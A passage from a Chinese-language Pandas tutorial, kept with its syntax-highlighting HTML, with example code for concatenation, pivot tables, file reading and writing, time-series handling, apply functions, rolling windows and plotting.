punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======================='</span><span class="token punctuation">)</span><span class="token comment"># 垂直连接(默认axis=0)</span>concatenated_vertical <span class="token operator">=</span> pd<span class="token punctuation">.</span>concat<span class="token punctuation">(</span><span class="token punctuation">[</span>df1<span class="token punctuation">,</span> df2<span class="token punctuation">]</span><span class="token punctuation">,</span> ignore_index<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"垂直连接:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>concatenated_vertical<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======================='</span><span class="token punctuation">)</span><span class="token comment"># 水平连接(axis=1)</span>concatenated_horizontal <span class="token operator">=</span> pd<span class="token punctuation">.</span>concat<span class="token punctuation">(</span><span class="token punctuation">[</span>df1<span class="token punctuation">,</span> df2<span class="token punctuation">]</span><span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"水平连接:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>concatenated_horizontal<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4.5 数据透视表 (Pivot Table)</strong></p><p>pivot_table() 方法用于创建数据透视表，可以根据指定的列对数据进行重塑和汇总。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'date'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'2023-01-01'</span><span class="token punctuation">,</span> <span class="token string">'2023-01-01'</span><span class="token punctuation">,</span> <span class="token string">'2023-01-02'</span><span class="token punctuation">,</span> <span class="token string">'2023-01-02'</span><span class="token punctuation">,</span> <span class="token string">'2023-01-03'</span><span class="token punctuation">,</span> <span class="token string">'2023-01-03'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'product'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'sales'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>pivot_df <span class="token operator">=</span> df<span class="token punctuation">.</span>pivot_table<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'date'</span><span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token string">'product'</span><span class="token punctuation">,</span> values<span class="token operator">=</span><span class="token string">'sales'</span><span class="token punctuation">,</span> aggfunc<span class="token operator">=</span><span class="token string">'sum'</span><span class="token punctuation">,</span> fill_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pivot_df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="5-Pandas-文件读写"><a href="#5-Pandas-文件读写" class="headerlink" title="5. Pandas 文件读写"></a><strong>5. Pandas 文件读写</strong></h3><p>Pandas 提供了强大的文件读写功能，可以方便地处理各种数据文件。</p><p><strong>5.1 读取 CSV 文件</strong></p><p>CSV (Comma Separated Values) 是一种常见的文本文件格式，用于存储表格数据。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment"># 读取 CSV 文件</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'data.csv'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 指定分隔符，如果不是逗号，使用 sep 参数</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 读取指定列</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'data.csv'</span><span class="token punctuation">,</span> usecols<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.2 读取 Excel 文件</strong></p><p>Pandas 可以直接读取 Excel 文件（.xls 和 .xlsx）。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment"># 读取 Excel 文件</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'data.xlsx'</span><span class="token punctuation">,</span> sheet_name<span class="token operator">=</span><span class="token string">'Sheet1'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 读取指定 sheet</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'data.xlsx'</span><span class="token punctuation">,</span> sheet_name<span class="token operator">=</span><span class="token string">'Sheet2'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 读取指定列</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'data.xlsx'</span><span class="token punctuation">,</span> sheet_name<span class="token operator">=</span><span class="token string">'Sheet1'</span><span class="token punctuation">,</span> usecols<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.3 读取其他类型文件</strong></p><p>Pandas 还支持读取其他类型的文件，例如：</p><ul><li><strong>JSON</strong>: pd.read_json()</li><li><strong>HTML</strong>: pd.read_html()</li><li><strong>SQL</strong>: pd.read_sql()</li></ul><p><strong>5.4 写入文件</strong></p><p>可以将 DataFrame 写入到不同的文件格式。</p><p><strong>5.4.1 写入 CSV 文件</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 写入 CSV 文件</span>df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'output.csv'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># index=False 表示不写入行索引</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.4.2 写入 Excel 文件</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 写入 Excel 文件</span>df<span class="token punctuation">.</span>to_excel<span class="token punctuation">(</span><span class="token string">'output.xlsx'</span><span class="token punctuation">,</span> sheet_name<span class="token operator">=</span><span class="token string">'Sheet1'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.4.3 写入其他类型文件</strong></p><ul><li><strong>JSON</strong>: df.to_json()</li><li><strong>HTML</strong>: df.to_html()</li><li><strong>SQL</strong>: df.to_sql()</li></ul><hr><h3 id="6-Pandas-时间序列数据处理"><a href="#6-Pandas-时间序列数据处理" class="headerlink" title="6. Pandas 时间序列数据处理"></a><strong>6. Pandas 时间序列数据处理</strong></h3><p>Pandas 提供了强大的时间序列数据处理能力，可以方便地分析和处理时间序列数据。</p><p><strong>6.1 时间戳 (Timestamp)</strong></p><p>时间戳是表示特定时间点的对象。Pandas 可以使用 pd.Timestamp 创建时间戳。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment"># 创建时间戳</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Timestamp<span class="token punctuation">(</span><span class="token string">'2023-10-26 12:30:00'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>ts<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 从字符串创建时间戳</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token string">'2023-10-26'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6.2 时间范围 (Date Range)</strong></p><p>pd.date_range() 方法可以创建指定时间范围内的一系列时间戳。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment"># 创建时间范围</span>date_range <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'2023-10-01'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>date_range<span class="token punctuation">)</span>date_range <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'2023-10-01'</span><span class="token punctuation">,</span> <span class="token string">'2023-10-10'</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'W'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>date_range<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>periods: 时间戳的数量。</li><li>freq: 时间间隔，如 ‘D’ (天), ‘W’ (周), ‘M’ (月), ‘H’ (小时), ‘T’ (分钟), ‘S’ (秒) 等。</li></ul><p><strong>6.3 时间序列索引</strong></p><p>可以将时间序列数据作为 DataFrame 或 Series 的索引，方便时间序列数据的分析。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment"># 创建时间序列索引</span>date_range <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'2023-10-01'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data<span class="token punctuation">,</span> index<span class="token operator">=</span>date_range<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">)</span><span class="token comment"># 使用时间序列索引选择数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">[</span><span class="token string">'2023-10-03'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">[</span><span class="token string">'2023-10-01'</span><span class="token punctuation">:</span><span class="token string">'2023-10-05'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6.4 时间重采样 (Resampling)</strong></p><p>resample() 方法可以对时间序列数据进行重采样，例如，将数据从天转换为周或月。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdate_range <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'2023-10-01'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data<span class="token punctuation">,</span> index<span class="token operator">=</span>date_range<span class="token punctuation">)</span><span class="token comment"># 将日数据重采样为周数据</span>weekly_ts <span class="token operator">=</span> ts<span class="token punctuation">.</span>resample<span class="token punctuation">(</span><span class="token string">'W'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>weekly_ts<span class="token punctuation">)</span><span class="token comment"># 将日数据重采样为月数据</span>monthly_ts <span class="token operator">=</span> ts<span class="token punctuation">.</span>resample<span class="token punctuation">(</span><span class="token string">'M'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>monthly_ts<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>.mean()：计算重采样后的平均值。</li><li>.sum()：计算重采样后的总和。</li><li>.min()：计算重采样后的最小值。</li><li>.max()：计算重采样后的最大值。</li><li>.first()：计算重采样后的第一个值。</li><li>.last()：计算重采样后的最后一个值。</li></ul><p><strong>6.5 时间序列常用方法</strong></p><ul><li>shift()：移动时间序列数据。</li><li>diff()：计算时间序列数据的差分。</li><li>asfreq()：转换为指定频率。</li><li>rolling()：计算滑动窗口统计量。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdate_range <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'2023-10-01'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data<span class="token punctuation">,</span> index<span class="token operator">=</span>date_range<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">.</span>shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 向下移动两个时间单位</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">.</span>diff<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 计算一阶差分</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">.</span>asfreq<span class="token punctuation">(</span><span class="token string">'H'</span><span class="token punctuation">,</span> fill_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#转换为小时频率</span><span class="token keyword">print</span><span class="token punctuation">(</span>ts<span class="token punctuation">.</span>rolling<span class="token punctuation">(</span>window<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 计算窗口为 3 的移动平均</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="7-Pandas-高级应用"><a href="#7-Pandas-高级应用" class="headerlink" title="7. Pandas 高级应用"></a><strong>7. Pandas 高级应用</strong></h3><p><strong>7.1.1 apply() 函数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 对 Series 应用函数</span><span class="token keyword">def</span> <span class="token function">square</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x <span class="token operator">**</span> <span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>square<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 对 DataFrame 的行或列应用函数</span><span class="token keyword">def</span> <span class="token function">row_sum</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> row<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>row_sum<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 对每一行应用求和操作</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>row_sum<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 对每一列应用求和操作</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7.1.2 applymap() 函数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 对 DataFrame 的每个元素应用函数</span><span class="token keyword">def</span> <span class="token function">add_one</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>applymap<span class="token punctuation">(</span>add_one<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7.2 窗口函数</strong></p><p>窗口函数可以对数据窗口进行计算，例如移动平均、滚动求和等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 移动平均</span>df<span class="token punctuation">[</span><span class="token string">'rolling_mean'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rolling<span class="token punctuation">(</span>window<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 累加</span>df<span class="token punctuation">[</span><span class="token string">'cumsum'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 窗口最大值</span>df<span class="token punctuation">[</span><span class="token string">'rolling_max'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rolling<span class="token punctuation">(</span>window<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 窗口最小值</span>df<span class="token punctuation">[</span><span class="token string">'rolling_min'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rolling<span class="token punctuation">(</span>window<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7.3 数据可视化</strong></p><p>Pandas 可以与 Matplotlib 等可视化库结合，方便进行数据可视化。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 绘制折线图</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Random Data Visualization'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Index'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Value'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 绘制直方图</span>data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">.</span>hist<span 